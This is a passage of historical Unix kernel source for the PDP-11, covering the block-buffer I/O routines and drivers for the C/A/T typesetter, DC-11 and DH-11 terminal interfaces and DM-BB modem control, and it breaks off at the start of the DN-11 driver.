#include "../param.h"
#include "../user.h"
#include "../buf.h"
#include "../conf.h"
#include "../systm.h"
#include "../proc.h"
#include "../seg.h"

/*
 * This is the set of buffers proper, whose heads
 * were declared in buf.h.  There can exist buffer
 * headers not pointing here that are used purely
 * as arguments to the I/O routines to describe
 * I/O to be done-- e.g. swbuf, just below, for
 * swapping.
 */
char	buffers[NBUF][514];
struct	buf	swbuf;

/*
 * Declarations of the tables for the magtape devices;
 * see bdwrite.
 */
int	tmtab;
int	httab;

/*
 * The following several routines allocate and free
 * buffers with various side effects.  In general the
 * arguments to an allocate routine are a device and
 * a block number, and the value is a pointer to
 * to the buffer header; the buffer is marked "busy"
 * so that no on else can touch it.  If the block was
 * already in core, no I/O need be done; if it is
 * already busy, the process waits until it becomes free.
 * The following routines allocate a buffer:
 *	getblk
 *	bread
 *	breada
 * Eventually the buffer must be released, possibly with the
 * side effect of writing it out, by using one of
 *	bwrite
 *	bdwrite
 *	bawrite
 *	brelse
 */

/*
 * Read in (if necessary) the block and return a buffer pointer.
 */
bread(dev, blkno)
{
	register struct buf *rbp;

	rbp = getblk(dev, blkno);
	if (rbp->b_flags&B_DONE)
		return(rbp);
	rbp->b_flags =| B_READ;
	rbp->b_wcount = -256;
	(*bdevsw[dev.d_major].d_strategy)(rbp);
	iowait(rbp);
	return(rbp);
}

/*
 * Read in the block, like bread, but also start I/O on the
 * read-ahead block (which is not allocated to the caller)
 */
breada(adev, blkno, rablkno)
{
	register struct buf *rbp, *rabp;
	register int dev;

	dev = adev;
	rbp = 0;
	if (!incore(dev, blkno)) {
		rbp = getblk(dev, blkno);
		if ((rbp->b_flags&B_DONE) == 0) {
			rbp->b_flags =| B_READ;
			rbp->b_wcount = -256;
			(*bdevsw[adev.d_major].d_strategy)(rbp);
		}
	}
	if (rablkno && !incore(dev, rablkno)) {
		rabp = getblk(dev, rablkno);
		if (rabp->b_flags & B_DONE)
			brelse(rabp);
		else {
			rabp->b_flags =| B_READ|B_ASYNC;
			rabp->b_wcount = -256;
			(*bdevsw[adev.d_major].d_strategy)(rabp);
		}
	}
	if (rbp==0)
		return(bread(dev, blkno));
	iowait(rbp);
	return(rbp);
}

/*
 * Write the buffer, waiting for completion.
 * Then release the buffer.
 */
bwrite(bp)
struct buf *bp;
{
	register struct buf *rbp;
	register flag;

	rbp = bp;
	flag = rbp->b_flags;
	rbp->b_flags =& ~(B_READ | B_DONE | B_ERROR | B_DELWRI);
	rbp->b_wcount = -256;
	(*bdevsw[rbp->b_dev.d_major].d_strategy)(rbp);
	if ((flag&B_ASYNC) == 0) {
		iowait(rbp);
		brelse(rbp);
	} else if ((flag&B_DELWRI)==0)
		geterror(rbp);
}

/*
 * Release the buffer, marking it so that if it is grabbed
 * for another purpose it will be written out before being
 * given up (e.g. when writing a partial block where it is
 * assumed that another write for the same block will soon follow).
 * This can't be done for magtape, since writes must be done
 * in the same order as requested.
 */
bdwrite(bp)
struct buf *bp;
{
	register struct buf *rbp;
	register struct devtab *dp;

	rbp = bp;
	dp = bdevsw[rbp->b_dev.d_major].d_tab;
	if (dp == &tmtab || dp == &httab)
		bawrite(rbp);
	else {
		rbp->b_flags =| B_DELWRI | B_DONE;
		brelse(rbp);
	}
}

/*
 * Release the buffer, start I/O on it, but don't wait for completion.
 */
bawrite(bp)
struct buf *bp;
{
	register struct buf *rbp;

	rbp = bp;
	rbp->b_flags =| B_ASYNC;
	bwrite(rbp);
}

/*
 * release the buffer, with no I/O implied.
 */
brelse(bp)
struct buf *bp;
{
	register struct buf *rbp, **backp;
	register int sps;

	rbp = bp;
	if (rbp->b_flags&B_WANTED)
		wakeup(rbp);
	if (bfreelist.b_flags&B_WANTED) {
		bfreelist.b_flags =& ~B_WANTED;
		wakeup(&bfreelist);
	}
	if (rbp->b_flags&B_ERROR)
		rbp->b_dev.d_minor = -1;  /* no assoc. on error */
	backp = &bfreelist.av_back;
	sps = PS->integ;
	spl6();
	rbp->b_flags =& ~(B_WANTED|B_BUSY|B_ASYNC);
	(*backp)->av_forw = rbp;
	rbp->av_back = *backp;
	*backp = rbp;
	rbp->av_forw = &bfreelist;
	PS->integ = sps;
}

/*
 * See if the block is associated with some buffer
 * (mainly to avoid getting hung up on a wait in breada)
 */
incore(adev, blkno)
{
	register int dev;
	register struct buf *bp;
	register struct devtab *dp;

	dev = adev;
	dp = bdevsw[adev.d_major].d_tab;
	for (bp=dp->b_forw; bp != dp; bp = bp->b_forw)
		if (bp->b_blkno==blkno && bp->b_dev==dev)
			return(bp);
	return(0);
}

/*
 * Assign a buffer for the given block.  If the appropriate
 * block is already associated, return it; otherwise search
 * for the oldest non-busy buffer and reassign it.
 * When a 512-byte area is wanted for some random reason
 * (e.g. during exec, for the user arglist) getblk can be called
 * with device NODEV to avoid unwanted associativity.
 */
getblk(dev, blkno)
{
	register struct buf *bp;
	register struct devtab *dp;
	extern lbolt;

	if(dev.d_major >= nblkdev)
		panic("blkdev");

    loop:
	if (dev < 0)
		dp = &bfreelist;
	else {
		dp = bdevsw[dev.d_major].d_tab;
		if(dp == NULL)
			panic("devtab");
		for (bp=dp->b_forw; bp != dp; bp = bp->b_forw) {
			if (bp->b_blkno!=blkno || bp->b_dev!=dev)
				continue;
			spl6();
			if (bp->b_flags&B_BUSY) {
				bp->b_flags =| B_WANTED;
				sleep(bp, PRIBIO);
				spl0();
				goto loop;
			}
			spl0();
			notavail(bp);
			return(bp);
		}
	}
	spl6();
	if (bfreelist.av_forw == &bfreelist) {
		bfreelist.b_flags =| B_WANTED;
		sleep(&bfreelist, PRIBIO);
		spl0();
		goto loop;
	}
	spl0();
	notavail(bp = bfreelist.av_forw);
	if (bp->b_flags & B_DELWRI) {
		bp->b_flags =| B_ASYNC;
		bwrite(bp);
		goto loop;
	}
	bp->b_flags = B_BUSY | B_RELOC;
	bp->b_back->b_forw = bp->b_forw;
	bp->b_forw->b_back = bp->b_back;
	bp->b_forw = dp->b_forw;
	bp->b_back = dp;
	dp->b_forw->b_back = bp;
	dp->b_forw = bp;
	bp->b_dev = dev;
	bp->b_blkno = blkno;
	return(bp);
}

/*
 * Wait for I/O completion on the buffer; return errors
 * to the user.
 */
iowait(bp)
struct buf *bp;
{
	register struct buf *rbp;

	rbp = bp;
	spl6();
	while ((rbp->b_flags&B_DONE)==0)
		sleep(rbp, PRIBIO);
	spl0();
	geterror(rbp);
}

/*
 * Unlink a buffer from the available list and mark it busy.
 * (internal interface)
 */
notavail(bp)
struct buf *bp;
{
	register struct buf *rbp;
	register int sps;

	rbp = bp;
	sps = PS->integ;
	spl6();
	rbp->av_back->av_forw = rbp->av_forw;
	rbp->av_forw->av_back = rbp->av_back;
	rbp->b_flags =| B_BUSY;
	PS->integ = sps;
}

/*
 * Mark I/O complete on a buffer, release it if I/O is asynchronous,
 * and wake up anyone waiting for it.
 */
iodone(bp)
struct buf *bp;
{
	register struct buf *rbp;

	rbp = bp;
	if(rbp->b_flags&B_MAP)
		mapfree(rbp);
	rbp->b_flags =| B_DONE;
	if (rbp->b_flags&B_ASYNC)
		brelse(rbp);
	else {
		rbp->b_flags =& ~B_WANTED;
		wakeup(rbp);
	}
}

/*
 * Zero the core associated with a buffer.
 */
clrbuf(bp)
int *bp;
{
	register *p;
	register c;

	p = bp->b_addr;
	c = 256;
	do
		*p++ = 0;
	while (--c);
}

/*
 * Initialize the buffer I/O system by freeing
 * all buffers and setting all device buffer lists to empty.
 */
binit()
{
	register struct buf *bp;
	register struct devtab *dp;
	register int i;
	struct bdevsw *bdp;

	bfreelist.b_forw = bfreelist.b_back =
	    bfreelist.av_forw = bfreelist.av_back = &bfreelist;
	for (i=0; i<NBUF; i++) {
		bp = &buf[i];
		bp->b_dev = -1;
		bp->b_addr = buffers[i];
		bp->b_back = &bfreelist;
		bp->b_forw = bfreelist.b_forw;
		bfreelist.b_forw->b_back = bp;
		bfreelist.b_forw = bp;
		bp->b_flags = B_BUSY;
		brelse(bp);
	}
	i = 0;
	for (bdp = bdevsw; bdp->d_open; bdp++) {
		dp = bdp->d_tab;
		if(dp) {
			dp->b_forw = dp;
			dp->b_back = dp;
		}
		i++;
	}
	nblkdev = i;
}

/*
 * Device start routine for disks
 * and other devices that have the register
 * layout of the older DEC controllers (RF, RK, RP, TM)
 */
#define	IENABLE	0100
#define	WCOM	02
#define	RCOM	04
#define	GO	01
devstart(bp, devloc, devblk, hbcom)
struct buf *bp;
int *devloc;
{
	register int *dp;
	register struct buf *rbp;
	register int com;

	dp = devloc;
	rbp = bp;
	*dp = devblk;			/* block address */
	*--dp = rbp->b_addr;		/* buffer address */
	*--dp = rbp->b_wcount;		/* word count */
	com = (hbcom<<8) | IENABLE | GO |
		((rbp->b_xmem & 03) << 4);
	if (rbp->b_flags&B_READ)	/* command + x-mem */
		com =| RCOM;
	else
		com =| WCOM;
	*--dp = com;
}

/*
 * startup routine for RH controllers.
 */
#define	RHWCOM	060
#define	RHRCOM	070

rhstart(bp, devloc, devblk, abae)
struct buf *bp;
int *devloc, *abae;
{
	register int *dp;
	register struct buf *rbp;
	register int com;

	dp = devloc;
	rbp = bp;
	if(cputype == 70)
		*abae = rbp->b_xmem;
	*dp = devblk;			/* block address */
	*--dp = rbp->b_addr;		/* buffer address */
	*--dp = rbp->b_wcount;		/* word count */
	com = IENABLE | GO |
		((rbp->b_xmem & 03) << 8);
	if (rbp->b_flags&B_READ)	/* command + x-mem */
		com =| RHRCOM; else
		com =| RHWCOM;
	*--dp = com;
}

/*
 * 11/70 routine to allocate the
 * UNIBUS map and initialize for
 * a unibus device.
 * The code here and in
 * rhstart assumes that an rh on an 11/70
 * is an rh70 and contains 22 bit addressing.
 */
int	maplock;
mapalloc(abp)
struct buf *abp;
{
	register i, a;
	register struct buf *bp;

	if(cputype != 70)
		return;
	spl6();
	while(maplock&B_BUSY) {
		maplock =| B_WANTED;
		sleep(&maplock, PSWP);
	}
	maplock =| B_BUSY;
	spl0();
	bp = abp;
	bp->b_flags =| B_MAP;
	a = bp->b_xmem;
	for(i=16; i<32; i=+2)
		UBMAP->r[i+1] = a;
	for(a++; i<48; i=+2)
		UBMAP->r[i+1] = a;
	bp->b_xmem = 1;
}

mapfree(bp)
struct buf *bp;
{

	bp->b_flags =& ~B_MAP;
	if(maplock&B_WANTED)
		wakeup(&maplock);
	maplock = 0;
}

/*
 * swap I/O
 */
swap(blkno, coreaddr, count, rdflg)
{
	register int *fp;

	fp = &swbuf.b_flags;
	spl6();
	while (*fp&B_BUSY) {
		*fp =| B_WANTED;
		sleep(fp, PSWP);
	}
	*fp = B_BUSY | B_PHYS | rdflg;
	swbuf.b_dev = swapdev;
	swbuf.b_wcount = - (count<<5);	/* 32 w/block */
	swbuf.b_blkno = blkno;
	swbuf.b_addr = coreaddr<<6;	/* 64 b/block */
	swbuf.b_xmem = (coreaddr>>10) & 077;
	(*bdevsw[swapdev>>8].d_strategy)(&swbuf);
	spl6();
	while((*fp&B_DONE)==0)
		sleep(fp, PSWP);
	if (*fp&B_WANTED)
		wakeup(fp);
	spl0();
	*fp =& ~(B_BUSY|B_WANTED);
	return(*fp&B_ERROR);
}

/*
 * make sure all write-behind blocks
 * on dev (or NODEV for all)
 * are flushed out.
 * (from umount and update)
 */
bflush(dev)
{
	register struct buf *bp;

loop:
	spl6();
	for (bp = bfreelist.av_forw; bp != &bfreelist; bp = bp->av_forw) {
		if (bp->b_flags&B_DELWRI && (dev == NODEV||dev==bp->b_dev)) {
			bp->b_flags =| B_ASYNC;
			notavail(bp);
			bwrite(bp);
			goto loop;
		}
	}
	spl0();
}

/*
 * Raw I/O. The arguments are
 *	The strategy routine for the device
 *	A buffer, which will always be a special buffer
 *	  header owned exclusively by the device for this purpose
 *	The device number
 *	Read/write flag
 * Essentially all the work is computing physical addresses and
 * validating them.
 */
physio(strat, abp, dev, rw)
struct buf *abp;
int (*strat)();
{
	register struct buf *bp;
	register char *base;
	register int nb;
	int ts;

	bp = abp;
	base = u.u_base;
	/*
	 * Check odd base, odd count, and address wraparound
	 */
	if (base&01 || u.u_count&01 || base>=base+u.u_count)
		goto bad;
	ts = (u.u_tsize+127) & ~0177;
	if (u.u_sep)
		ts = 0;
	nb = (base>>6) & 01777;
	/*
	 * Check overlap with text. (ts and nb now
	 * in 64-byte clicks)
	 */
	if (nb < ts)
		goto bad;
	/*
	 * Check that transfer is either entirely in the
	 * data or in the stack: that is, either
	 * the end is in the data or the start is in the stack
	 * (remember wraparound was already checked).
	 */
	if ((((base+u.u_count)>>6)&01777) >= ts+u.u_dsize
	    && nb < 1024-u.u_ssize)
		goto bad;
	spl6();
	while (bp->b_flags&B_BUSY) {
		bp->b_flags =| B_WANTED;
		sleep(bp, PRIBIO);
	}
	bp->b_flags = B_BUSY | B_PHYS | rw;
	bp->b_dev = dev;
	/*
	 * Compute physical address by simulating
	 * the segmentation hardware.
	 */
	bp->b_addr = base&077;
	base = (u.u_sep? UDSA: UISA)->r[nb>>7] + (nb&0177);
	bp->b_addr =+ base<<6;
	bp->b_xmem = (base>>10) & 077;
	bp->b_blkno = lshift(u.u_offset, -9);
	bp->b_wcount = -((u.u_count>>1) & 077777);
	bp->b_error = 0;
	u.u_procp->p_flag =| SLOCK;
	(*strat)(bp);
	spl6();
	while ((bp->b_flags&B_DONE) == 0)
		sleep(bp, PRIBIO);
	u.u_procp->p_flag =& ~SLOCK;
	if (bp->b_flags&B_WANTED)
		wakeup(bp);
	spl0();
	bp->b_flags =& ~(B_BUSY|B_WANTED);
	u.u_count = (-bp->b_resid)<<1;
	geterror(bp);
	return;
    bad:
	u.u_error = EFAULT;
}

/*
 * Pick up the device's error number and pass it to the user;
 * if there is an error but the number is 0 set a generalized
 * code.  Actually the latter is always true because devices
 * don't yet return specific errors.
 */
geterror(abp)
struct buf *abp;
{
	register struct buf *bp;

	bp = abp;
	if (bp->b_flags&B_ERROR)
		if ((u.u_error = bp->b_error)==0)
			u.u_error = EIO;
}
-- /usr/sys/dmr/cat.c mode=0100664 uid=3 gid=3 atime=174921836 mtime=174843307 --
#
/*
 */

/*
 * GP DR11C driver used for C/A/T
 */

#include "../param.h"
#include "../user.h"
#include "../tty.h"

#define	CATADDR	0167750
#define	PCAT	9
#define	CATHIWAT	60
#define	CATLOWAT	15

struct {
	int	catlock;
	struct	clist	oq;
} cat;

struct {
	int	catcsr;
	int	catbuf;
};

ctopen(dev)
{
	if (cat.catlock==0) {
		cat.catlock++;
		CATADDR->catcsr =| IENABLE;
	} else
		u.u_error = ENXIO;
}

ctclose()
{
	cat.catlock = 0;
}

ctwrite(dev)
{
	register c;
	extern lbolt;

	while ((c=cpass()) >= 0) {
		spl5();
		while (cat.oq.c_cc > CATHIWAT)
			sleep(&cat.oq, PCAT);
		while (putc(c, &cat.oq) < 0)
			sleep(&lbolt, PCAT);
		catintr();
		spl0();
	}
}

catintr()
{
	register int c;

	if (CATADDR->catcsr&DONE && (c=getc(&cat.oq))>=0) {
		CATADDR->catbuf = c;
		if (cat.oq.c_cc==0 || cat.oq.c_cc==CATLOWAT)
			wakeup(&cat.oq);
	} else {
		if (cat.catlock==0)
			CATADDR->catcsr = 0;
	}
}
-- /usr/sys/dmr/dc.c mode=0110664 uid=3 gid=3 atime=174921842 mtime=174843311 --
#
/*
 */

/*
 *   DC-11 driver
 */
#include "../param.h"
#include "../conf.h"
#include "../user.h"
#include "../tty.h"
#include "../proc.h"

/*
 * Base address of DC-11's. Minor device  i  is at
 * DCADDR + 10*i.
 */
#define	DCADDR	0174000

/*
 * Number of DC's for which table space is allocated.
 */
#define	NDC11	14

/*
 * Control bits in device registers
 */
#define	CDLEAD	01
#define	CARRIER	04
#define	SPEED1	010
#define	STOP1	0400
#define	RQSEND	01
#define	PARITY	040
#define	ERROR	0100000
#define	CTRANS	040000
#define	RINGIND	020000


struct	tty dc11[NDC11];

struct dcregs {
	int dcrcsr;
	int dcrbuf;
	int dctcsr;
	int dctbuf;
};

/*
 * Input-side speed and control bit table.
 * Each DC11 has 4 speeds which correspond to the 4 non-zero entries.
 * The table index is the same as the speed-selector
 * number for the DH11.
 * Attempts to set the speed to a zero entry are ignored.
 */
int dcrstab[] {
	0,		/* 0 baud */
	0,		/* 50 baud */
	0,		/* 75 baud */
	0,		/* 110 baud */
	01101,		/* 134.5 baud: 7b/ch, speed 0 */
	0111,		/* 150 baud: 8b/ch, speed 1 */
	0,		/* 200 baud */
	0121,		/* 300 baud: 8b/ch, speed 2 */
	0,		/* 600 baud */
	0131,		/* 1200 baud */
	0,		/* 1800 baud */
	0,		/* 2400 baud */
	0,		/* 4800 baud */
	0,		/* 9600 baud */
	0,		/* X0 */
	0,		/* X1 */
};

/*
 * Transmitter speed table
 */
int dctstab[] {
	0,		/* 0 baud */
	0,		/* 50 baud */
	0,		/* 75 baud */
	0,		/* 110 baud */
	0501,		/* 134.5 baud: stop 1 */
	0511,		/* 150 baud */
	0,		/* 200 baud */
	0521,		/* 300 baud */
	0,		/* 600 baud */
	0531,		/* 1200 baud */
	0,		/* 1800 baud */
	0,		/* 2400 baud */
	0,		/* 4800 baud */
	0,		/* 9600 baud */
	0,		/* X0 */
	0,		/* X1 */
};

/*
 * Open a DC11, waiting until carrier is established.
 * Default initial conditions are set up on the first open.
 * t_state's CARR_ON bit is a pure copy of the hardware
 * CARRIER bit, and is only used to regularize
 * carrier tests in general tty routines.
 */
dcopen(dev, flag)
{
	register struct tty *rtp;
	register *addr;

	if (dev.d_minor >= NDC11) {
		u.u_error = ENXIO;
		return;
	}
	rtp = &dc11[dev.d_minor];
	rtp->t_addr = addr = DCADDR + dev.d_minor*8;
	rtp->t_state =| WOPEN;
	addr->dcrcsr =| IENABLE|CDLEAD;
	if ((rtp->t_state&ISOPEN) == 0) {
		rtp->t_erase = CERASE;
		rtp->t_kill = CKILL;
		addr->dcrcsr = IENABLE|CDLEAD|SPEED1;
		addr->dctcsr = IENABLE|SPEED1|STOP1|RQSEND;
		rtp->t_state = ISOPEN | WOPEN;
		rtp->t_flags = ODDP|EVENP|ECHO;
	}
	if (addr->dcrcsr & CARRIER)
		rtp->t_state =| CARR_ON;
	while ((rtp->t_state & CARR_ON) == 0)
		sleep(&rtp->t_rawq, TTIPRI);
	rtp->t_state =& ~WOPEN;
	if (u.u_procp->p_ttyp == 0) {
		u.u_procp->p_ttyp = rtp;
		rtp->t_dev = dev;
	}
}

/*
 * Close a dc11
 */
dcclose(dev)
{
	register struct tty *tp;

	(tp = &dc11[dev.d_minor])->t_state = 0;
	if (tp->t_flags&HUPCL)
		tp->t_addr->dcrcsr =& ~CDLEAD;
	wflushtty(tp);
}

/*
 * Read a DC11
 */
dcread(dev)
{
	ttread(&dc11[dev.d_minor]);
}

/*
 * Write a DC11
 */
dcwrite(dev)
{
	ttwrite(&dc11[dev.d_minor]);
}

/*
 * DC11 transmitter interrupt.
 */
dcxint(dev)
{
	register struct tty *tp;

	ttstart(tp = &dc11[dev.d_minor]);
	if (tp->t_outq.c_cc == 0 || tp->t_outq.c_cc == TTLOWAT)
		wakeup(&tp->t_outq);
}

/*
 * DC11 receiver interrupt.
 */
dcrint(dev)
{
	register struct tty *tp;
	register int c, csr;

	tp = &dc11[dev.d_minor];
	c = tp->t_addr->dcrbuf;
	/*
	 * If carrier is off, and an open is not in progress,
	 * knock down the CD lead to hang up the local dataset
	 * and signal a hangup.
	 */
	if (((csr = tp->t_addr->dcrcsr) & CARRIER) == 0) {
		if ((tp->t_state&WOPEN) == 0) {
			tp->t_addr->dcrcsr =& ~CDLEAD;
			if (tp->t_state & CARR_ON)
				signal(tp, SIGHUP);
			flushtty(tp);
		}
		tp->t_state =& ~CARR_ON;
		return;
	}
	if (csr&ERROR || (tp->t_state&ISOPEN)==0) {
		if (tp->t_state&WOPEN && csr&CARRIER)
			tp->t_state =| CARR_ON;
		wakeup(tp);
		return;
	}
	csr =& PARITY;
	if (csr&&(tp->t_flags&ODDP) || !csr&&(tp->t_flags&EVENP))
		ttyinput(c, tp);
}

/*
 * DC11 stty/gtty.
 * Perform general functions and set speeds.
 */
dcsgtty(dev, av)
int *av;
{
	register struct tty *tp;
	register r;

	tp = &dc11[dev.d_minor];
	if (ttystty(tp, av))
		return;
	if (r = dcrstab[tp->t_speeds.lobyte&017])
		tp->t_addr->dcrcsr = r;
	else
		tp->t_addr->dcrcsr =& ~CDLEAD;
	if (r = dctstab[tp->t_speeds.hibyte&017])
		tp->t_addr->dctcsr = r;
}
-- /usr/sys/dmr/dh.c mode=0110664 uid=3 gid=3 atime=174921852 mtime=174843316 --
#
/*
 */

/*
 *	DH-11 driver
 *	This driver calls on the DHDM driver.
 *	If the DH has no DM11-BB, then the latter will
 *	be fake. To insure loading of the correct DM code,
 *	lib2 should have dhdm.o, dh.o and dhfdm.o in that order.
 */

#include "../param.h"
#include "../conf.h"
#include "../user.h"
#include "../tty.h"
#include "../proc.h"

#define	DHADDR	0160020
#define	NDH11	16	/* number of lines */
#define	DHNCH	8	/* max number of DMA chars */

struct	tty dh11[NDH11];
/*
 * Place from which to do DMA on output
 */
char	dh_clist[NDH11][DHNCH];

/*
 * Used to communicate the number of lines to the DM
 */
int	ndh11	NDH11;

/*
 * Hardware control bits
 */
#define	BITS6	01
#define	BITS7	02
#define	BITS8	03
#define	TWOSB	04
#define	PENABLE	020
/* DEC manuals incorrectly say this bit causes generation of even parity. */
#define	OPAR	040
#define	HDUPLX	040000

#define	IENABLE	030100
#define	PERROR	010000
#define	FRERROR	020000
#define	XINT	0100000
#define	SSPEED	7	/* standard speed: 300 baud */

/*
 * Software copy of last dhbar
 */
int	dhsar;

struct dhregs {
	int dhcsr;
	int dhnxch;
	int dhlpr;
	int dhcar;
	int dhbcr;
	int dhbar;
	int dhbreak;
	int dhsilo;
};

/*
 * Open a DH11 line.
 */
dhopen(dev, flag)
{
	register struct tty *tp;
	extern dhstart();

	if (dev.d_minor >= NDH11) {
		u.u_error = ENXIO;
		return;
	}
	tp = &dh11[dev.d_minor];
	tp->t_addr = dhstart;
	tp->t_dev = dev;
	DHADDR->dhcsr =| IENABLE;
	tp->t_state =| WOPEN|SSTART;
	if ((tp->t_state&ISOPEN) == 0) {
		tp->t_erase = CERASE;
		tp->t_kill = CKILL;
		tp->t_speeds = SSPEED | (SSPEED<<8);
		tp->t_flags = ODDP|EVENP|ECHO;
		dhparam(tp);
	}
	dmopen(dev);
	tp->t_state =& ~WOPEN;
	tp->t_state =| ISOPEN;
	if (u.u_procp->p_ttyp == 0)
		u.u_procp->p_ttyp = tp;
}

/*
 * Close a DH11 line.
 */
dhclose(dev)
{
	register struct tty *tp;

	tp = &dh11[dev.d_minor];
	dmclose(dev);
	tp->t_state =& (CARR_ON|SSTART);
	wflushtty(tp);
}

/*
 * Read from a DH11 line.
 */
dhread(dev)
{
	ttread(&dh11[dev.d_minor]);
}

/*
 * write on a DH11 line
 */
dhwrite(dev)
{
	ttwrite(&dh11[dev.d_minor]);
}

/*
 * DH11 receiver interrupt.
 */
dhrint()
{
	register struct tty *tp;
	register int c;

	while ((c = DHADDR->dhnxch) < 0) {	/* char. present */
		tp = &dh11[(c>>8)&017];
		if (tp >= &dh11[NDH11])
			continue;
		if((tp->t_state&ISOPEN)==0 || (c&PERROR)) {
			wakeup(tp);
			continue;
		}
		if (c&FRERROR)		/* break */
			if (tp->t_flags&RAW)
				c = 0;		/* null (for getty) */
			else
				c = 0177;	/* DEL (intr) */
		ttyinput(c, tp);
	}
}

/*
 * stty/gtty for DH11
 */
dhsgtty(dev, av)
int *av;
{
	register struct tty *tp;
	register r;

	tp = &dh11[dev.d_minor];
	if (ttystty(tp, av))
		return;
	dhparam(tp);
}

/*
 * Set parameters from open or stty into the DH hardware
 * registers.
 */
dhparam(atp)
struct tty *atp;
{
	register struct tty *tp;
	register int lpr;

	tp = atp;
	spl5();
	DHADDR->dhcsr.lobyte = tp->t_dev.d_minor | IENABLE;
	/*
	 * Hang up line?
	 */
	if (tp->t_speeds.lobyte==0) {
		tp->t_flags =| HUPCL;
		dmclose(tp->t_dev);
		return;
	}
	lpr = (tp->t_speeds.hibyte<<10) | (tp->t_speeds.lobyte<<6);
	if (tp->t_speeds.lobyte == 4)		/* 134.5 baud */
		lpr =| BITS6|PENABLE|HDUPLX; else
		if (tp->t_flags&EVENP)
			if (tp->t_flags&ODDP)
				lpr =| BITS8; else
				lpr =| BITS7|PENABLE; else
			lpr =| BITS7|OPAR|PENABLE;
	if (tp->t_speeds.lobyte == 3)	/* 110 baud */
		lpr =| TWOSB;
	DHADDR->dhlpr = lpr;
	spl0();
}

/*
 * DH11 transmitter interrupt.
 * Restart each line which used to be active but has
 * terminated transmission since the last interrupt.
 */
dhxint()
{
	register struct tty *tp;
	register ttybit, bar;

	bar = dhsar & ~DHADDR->dhbar;
	DHADDR->dhcsr =& ~XINT;
	ttybit = 1;
	for (tp = dh11; bar; tp++) {
		if(bar&ttybit) {
			dhsar =& ~ttybit;
			bar =& ~ttybit;
			tp->t_state =& ~BUSY;
			dhstart(tp);
		}
		ttybit =<< 1;
	}
}

/*
 * Start (restart) transmission on the given DH11 line.
 */
dhstart(atp)
struct tty *atp;
{
	extern ttrstrt();
	register c, nch;
	register struct tty *tp;
	int sps;
	char *cp;

	sps = PS->integ;
	spl5();
	tp = atp;
	/*
	 * If it's currently active, or delaying,
	 * no need to do anything.
	 */
	if (tp->t_state&(TIMEOUT|BUSY))
		goto out;
	/*
	 * t_char is a delay indicator which may have been
	 * left over from the last start.
	 * Arrange for the delay.
	 */
	if (c = tp->t_char) {
		tp->t_char = 0;
		timeout(ttrstrt, tp, (c&0177)+6);
		tp->t_state =| TIMEOUT;
		goto out;
	}
	cp = dh_clist[tp->t_dev.d_minor];
	nch = 0;
	/*
	 * Copy DHNCH characters, or up to a delay indicator,
	 * to the DMA area.
	 */
	while (nch > -DHNCH && (c = getc(&tp->t_outq))>=0) {
		if (c >= 0200) {
			tp->t_char = c;
			break;
		}
		*cp++ = c;
		nch--;
	}
	/*
	 * If the writer was sleeping on output overflow,
	 * wake him when low tide is reached.
	 */
	if (tp->t_outq.c_cc<=TTLOWAT && tp->t_state&ASLEEP) {
		tp->t_state =& ~ASLEEP;
		wakeup(&tp->t_outq);
	}
	/*
	 * If any characters were set up, start transmission;
	 * otherwise, check for possible delay.
	 */
	if (nch) {
		DHADDR->dhcsr.lobyte = tp->t_dev.d_minor | IENABLE;
		DHADDR->dhcar = cp+nch;
		DHADDR->dhbcr = nch;
		c = 1<<tp->t_dev.d_minor;
		DHADDR->dhbar =| c;
		dhsar =| c;
		tp->t_state =| BUSY;
	} else if (c = tp->t_char) {
		tp->t_char = 0;
		timeout(ttrstrt, tp, (c&0177)+6);
		tp->t_state =| TIMEOUT;
	}
    out:
	PS->integ = sps;
}
-- /usr/sys/dmr/dhdm.c mode=0100664 uid=3 gid=3 atime=174921861 mtime=174843320 --
#
/*
 */

/*
 *	DM-BB driver
 */
#include "../param.h"
#include "../tty.h"
#include "../conf.h"

#define	DMADDR	0170500

struct	tty dh11[];
int	ndh11;		/* Set by dh.c to number of lines */

#define	DONE	0200
#define	SCENABL	040
#define	CLSCAN	01000
#define	TURNON	07	/* RQ send, CD lead, line enable */
#define	TURNOFF	1	/* line enable only */
#define	CARRIER	0100

struct dmregs {
	int	dmcsr;
	int	dmlstat;
};

/*
 * Turn on the line associated with the (DH) device dev.
 */
dmopen(dev)
{
	register struct tty *tp;

	tp = &dh11[dev.d_minor];
	DMADDR->dmcsr = dev.d_minor;
	DMADDR->dmlstat = TURNON;
	if (DMADDR->dmlstat&CARRIER)
		tp->t_state =| CARR_ON;
	DMADDR->dmcsr = IENABLE|SCENABL;
	spl5();
	while ((tp->t_state&CARR_ON)==0)
		sleep(&tp->t_rawq, TTIPRI);
	spl0();
}

/*
 * If a DH line has the HUPCL mode,
 * turn off carrier when it is closed.
 */
dmclose(dev)
{
	register struct tty *tp;

	tp = &dh11[dev.d_minor];
	if (tp->t_flags&HUPCL) {
		DMADDR->dmcsr = dev.d_minor;
		DMADDR->dmlstat = TURNOFF;
		DMADDR->dmcsr = IENABLE|SCENABL;
	}
}

/*
 * DM11 interrupt.
 * Mainly, deal with carrier transitions.
 */
dmint()
{
	register struct tty *tp;

	if (DMADDR->dmcsr&DONE) {
		tp = &dh11[DMADDR->dmcsr&017];
		if (tp < &dh11[ndh11]) {
			wakeup(tp);
			if ((DMADDR->dmlstat&CARRIER)==0) {
				if ((tp->t_state&WOPEN)==0) {
					signal(tp, SIGHUP);
					DMADDR->dmlstat = 0;
					flushtty(tp);
				}
				tp->t_state =& ~CARR_ON;
			} else
				tp->t_state =| CARR_ON;
		}
		DMADDR->dmcsr = IENABLE|SCENABL;
	}
}
-- /usr/sys/dmr/dhfdm.c mode=0100664 uid=3 gid=3 atime=174921867 mtime=174843324 --
#
/*
 */

/*
 *	DM-BB fake driver
 */
#include "../tty.h"
#include "../conf.h"

struct	tty	dh11[];

dmopen(dev)
{
	register struct tty *tp;

	tp = &dh11[dev.d_minor];
	tp->t_state =| CARR_ON;
}

dmclose(dev)
{
}
-- /usr/sys/dmr/dn.c mode=0100664 uid=3 gid=3 atime=174921872 mtime=174843328 --
#
/*
 */

/*
 * DN-11 ACU interface
 */

#include "../param.h"
#include "../conf.h"
#include "../user.h"

struct dn {
	struct {
		char	dn_stat;
		char	dn_reg;
	} dn11[3];
}

#define	DNADDR	0175200

#define	PWI	00200
#define	ACR	00100
#define	DLO	0020
#define	DONE	0200
#define	IENABLE	0100
#define	DSS	040
#define	PND	020
#define	MENABLE	04
#define	DPR	02
#define	CRQ	01

#define	DNPRI	5

dnopen(dev, flag)
{
	register struct dn *dp;
	register int rdev;

	rdev = dev.d_minor;
	dp = &DNADDR->dn11[rdev];
